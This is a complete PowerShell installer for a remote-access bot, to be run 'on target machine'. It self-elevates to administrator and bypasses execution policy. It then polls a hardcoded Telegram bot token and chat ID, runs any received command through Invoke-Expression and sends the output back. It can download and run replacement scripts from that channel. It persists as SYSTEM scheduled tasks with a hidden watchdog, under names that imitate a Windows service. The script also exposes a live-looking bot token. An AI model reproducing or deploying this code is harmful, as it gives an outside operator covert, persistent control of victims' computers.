# Run this on target machine to deploy the bot
$installPath = "$env:APPDATA\win_svc.ps1"

$script = @'
# ===== AUTO ELEVATE =====
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ===== CONFIG =====
$BOT_TOKEN = "8831947700:AAGD6KzSPUQf_uHPL1nT5Q79XWjIZZqFVBc"
$CHAT_ID = "347753116"

$lastUpdate = 0
$updateMode = $false
$computerName = $env:COMPUTERNAME
$script:processedCommands = @{}

# ===== MUTEX FOR SINGLE INSTANCE =====
$mutex = New-Object System.Threading.Mutex($false, "Global\TGBot_$computerName")
if (-not $mutex.WaitOne(0, $false)) {
    Write-Host "Another instance is already running"
    exit
}

# ===== NETWORK WAIT =====
function Wait-ForNetwork {
    $attempts = 0
    while ($attempts -lt 12) {
        try {
            $null = Invoke-RestMethod -Uri "https://api.telegram.org" -TimeoutSec 5
            return $true
        } catch {
            $attempts++
            Start-Sleep -Seconds 5
        }
    }
    return $false
}

if (-not (Wait-ForNetwork)) {
    Write-Host "Network not available, exiting"
    exit
}

function Send($text, $replyToMessageId = $null) {
    $body = @{
        chat_id = $CHAT_ID
        text = "[$computerName]`n$text"
    }
    if ($replyToMessageId) {
        $body.reply_to_message_id = $replyToMessageId
    }
    
    $retry = 0
    do {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -Method Post -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
            return
        } catch {
            $retry++
            if ($retry -lt 3) { Start-Sleep -Seconds 2 }
        }
    } while ($retry -lt 3)
    
    Write-Host "Failed to send message after 3 attempts"
}

function GetUpdates {
    try {
        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdate&timeout=25" -TimeoutSec 30
        return $response
    } catch {
        return $null
    }
}

function DownloadFile($file_id, $savePath) {
    try {
        $file = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/getFile?file_id=$file_id"
        $filePath = $file.result.file_path
        $url = "https://api.telegram.org/file/bot$BOT_TOKEN/$filePath"
        Invoke-WebRequest $url -OutFile $savePath
        return $true
    } catch {
        return $false
    }
}

function IsCommandForMe($commandText) {
    if ($commandText -match "^@(\S+)\s+(.+)$") {
        $target = $matches[1]
        $cmd = $matches[2]
        
        if ($target -eq $computerName -or $target -eq "all" -or $target -eq "broadcast" -or $target -eq "everyone") {
            return $cmd
        }
        return $null
    }
    return $commandText
}

function IsCommandProcessed($messageId, $commandText) {
    $key = "$messageId`_$commandText"
    if ($script:processedCommands.ContainsKey($key)) {
        return $true
    }
    $script:processedCommands[$key] = $true
    
    if ($script:processedCommands.Count -gt 100) {
        $keysToRemove = $script:processedCommands.Keys | Select-Object -First 50
        foreach ($k in $keysToRemove) {
            $script:processedCommands.Remove($k)
        }
    }
    return $false
}

# ===== AUTO ACCEPT POWERSHELL POLICIES =====
function Set-PowerShellPolicy {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
        
        try {
            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force -ErrorAction SilentlyContinue
        } catch {}
        
        $env:POWERSHELL_TELEMETRY_OPTOUT = 1
        $env:POWERSHELL_UPDATECHECK = 'Off'
        
        $PSDefaultParameterValues['*:Confirm'] = $false
        $PSDefaultParameterValues['*:Force'] = $true
    } catch {}
}

Set-PowerShellPolicy

# ===== RANDOM DELAY TO PREVENT THUNDERING HERD =====
$randomDelay = Get-Random -Minimum 1 -Maximum 5
Start-Sleep -Seconds $randomDelay

Send "Bot started on $computerName"

$consecutiveErrors = 0

while ($true) {
    try {
        $updates = GetUpdates

        if ($updates -and $updates.result) {
            $consecutiveErrors = 0
            
            foreach ($u in $updates.result) {
                $lastUpdate = $u.update_id + 1

                if ($u.message.chat.id -ne $CHAT_ID) { continue }

                $messageId = $u.message.message_id

                if ($u.message.text) {
                    $fullCommand = $u.message.text
                    
                    $actualCommand = IsCommandForMe $fullCommand
                    
                    if ($actualCommand -eq $null) {
                        continue
                    }

                    if (IsCommandProcessed $messageId $actualCommand) {
                        Write-Host "Command already processed"
                        continue
                    }

                    if ($actualCommand -eq "/update") {
                        $updateMode = $true
                        Send "Update mode activated. Send new .ps1 file." $messageId
                        continue
                    }

                    if ($actualCommand -eq "/status") {
                        $processes = (Get-Process).Count
                        $uptime = (Get-Date) - (Get-Process -Id $PID).StartTime
                        $os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
                        $status = "Status Report`n" + `
                                  "Computer: $computerName`n" + `
                                  "OS: $os`n" + `
                                  "Uptime: $($uptime.ToString('hh\h mm\m ss\s'))`n" + `
                                  "Processes: $processes`n" + `
                                  "Memory: $([math]::Round((Get-Process -Id $PID).WorkingSet64/1MB, 2)) MB"
                        Send $status $messageId
                        continue
                    }

                    if ($actualCommand -eq "/test") {
                        Send "Test OK - $computerName is alive!`nTime: $(Get-Date -Format 'HH:mm:ss')" $messageId
                        continue
                    }
                    
                    if ($actualCommand -eq "/ping") {
                        Send "Pong from $computerName" $messageId
                        continue
                    }
                    
                    if ($actualCommand -eq "/who") {
                        $user = whoami 2>&1 | Out-String
                        Send "Current user: $user" $messageId
                        continue
                    }

                    Send "Executing command..." $messageId
                    
                    try {
                        $out = & {
                            $ErrorActionPreference = 'Continue'
                            Invoke-Expression $actualCommand 2>&1
                        } | Out-String -Width 4096
                        
                        if ([string]::IsNullOrWhiteSpace($out)) {
                            $out = "Command executed successfully (no output)"
                        }
                        
                        if ($out -eq "Command executed successfully (no output)" -and $actualCommand -match "whoami|hostname|dir|ls|ipconfig|systeminfo") {
                            $tmpOut = "$env:TEMP\cmdout_$([Guid]::NewGuid()).txt"
                            Start-Process powershell -ArgumentList "-NoProfile -Command `"$actualCommand > '$tmpOut' 2>&1; exit`"" -Wait -WindowStyle Hidden
                            if (Test-Path $tmpOut) {
                                $fileOut = Get-Content $tmpOut -Raw -ErrorAction SilentlyContinue
                                if ($fileOut) {
                                    $out = $fileOut
                                }
                                Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue
                            }
                        }
                        
                    } catch {
                        $out = "Error: $($_.Exception.Message)"
                    }

                    $maxLength = 3800
                    if ($out.Length -gt $maxLength) {
                        $out = $out.Substring(0, $maxLength) + "`n... (truncated)"
                    }
                    
                    Send $out $messageId
                }

                if ($updateMode -and $u.message.document) {
                    $fileName = $u.message.document.file_name

                    if ($fileName -like "*.ps1") {
                        $newPath = "$env:TEMP\update_$([Guid]::NewGuid()).ps1"

                        if (DownloadFile $u.message.document.file_id $newPath) {
                            Send "Updating $computerName..." $messageId

                            $valid = $true
                            try {
                                $null = Get-Command $newPath -ErrorAction Stop
                            } catch {
                                $valid = $false
                                Send "Invalid script file" $messageId
                            }

                            if ($valid) {
                                Copy-Item $PSCommandPath "$PSCommandPath.backup" -Force -ErrorAction SilentlyContinue
                                Copy-Item $newPath $PSCommandPath -Force
                                Remove-Item $newPath -Force -ErrorAction SilentlyContinue
                                
                                Send "$computerName updated. Restarting..." $messageId
                                Start-Sleep 2
                                
                                Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
                                $mutex.ReleaseMutex()
                                exit
                            }
                        } else {
                            Send "Failed to download file" $messageId
                        }
                    } else {
                        Send "Please send a .ps1 file" $messageId
                    }
                    
                    $updateMode = $false
                }
            }
        }
    } catch {
        $consecutiveErrors++
        Write-Host "Error in main loop: $_"
        
        $sleepTime = if ($consecutiveErrors -gt 5) { 30 } else { 10 }
        Start-Sleep $sleepTime
    }

    $jitter = Get-Random -Minimum 1 -Maximum 3
    Start-Sleep $jitter
}

$mutex.ReleaseMutex()
'@

# Save bot script
Set-Content -Path $installPath -Value $script -Force

# ===== WATCHDOG SCRIPT =====
$watchdogPath = "$env:APPDATA\win_svc_watchdog.ps1"

$watchdog = @'
# Watchdog: ensures exactly one instance of win_svc.ps1 is running
$botScript = "$env:APPDATA\win_svc.ps1"
$computerName = $env:COMPUTERNAME

# Count running instances that match the bot script path
$running = @(Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -and $_.CommandLine -like "*win_svc.ps1*" })

if ($running.Count -eq 0) {
    # No instance running -> start one
    Start-Process powershell.exe -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$botScript`"" -WindowStyle Hidden
} elseif ($running.Count -gt 1) {
    # More than one instance -> kill extras, keep the oldest
    $sorted = $running | Sort-Object CreationDate
    $keep = $sorted[0].ProcessId
    $sorted | Select-Object -Skip 1 | ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }
}
'@

Set-Content -Path $watchdogPath -Value $watchdog -Force

# Stop any existing bot instances (only win_svc.ps1, sys_tg.ps1 termination removed)
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -and $_.CommandLine -like "*win_svc.ps1*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

# Remove old scheduled tasks if they exist
$botTaskName = "WinSvc_$env:COMPUTERNAME"
$watchdogTaskName = "WinSvcWatchdog_$env:COMPUTERNAME"
Unregister-ScheduledTask -TaskName $botTaskName -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $watchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "TelegramBot_$env:COMPUTERNAME" -Confirm:$false -ErrorAction SilentlyContinue

# ===== MAIN BOT TASK (infinite run) =====
$botAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""
$botTrigger = New-ScheduledTaskTrigger -AtStartup
# No RestartCount limit -> infinite restarts, no ExecutionTimeLimit -> runs forever
$botSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -RestartCount 0 `
    -ExecutionTimeLimit ([TimeSpan]::Zero) `
    -MultipleInstances IgnoreNew
$botPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $botTaskName -Action $botAction -Trigger $botTrigger -Settings $botSettings -Principal $botPrincipal -Force | Out-Null

# ===== WATCHDOG TASK (runs every 5 minutes, infinite) =====
$wdAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`""
$wdTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 5)
$wdSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit ([TimeSpan]::Zero) `
    -MultipleInstances IgnoreNew
$wdPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $watchdogTaskName -Action $wdAction -Trigger $wdTrigger -Settings $wdSettings -Principal $wdPrincipal -Force | Out-Null

# Start both now
Start-ScheduledTask -TaskName $botTaskName -ErrorAction SilentlyContinue
Start-ScheduledTask -TaskName $watchdogTaskName -ErrorAction SilentlyContinue

Write-Host "Bot + watchdog deployed on $env:COMPUTERNAME" -ForegroundColor Green
Write-Host "  Bot task:      $botTaskName  (infinite run)" -ForegroundColor Cyan
Write-Host "  Watchdog task: $watchdogTaskName  (every 5 min, single-instance enforced)" -ForegroundColor Cyan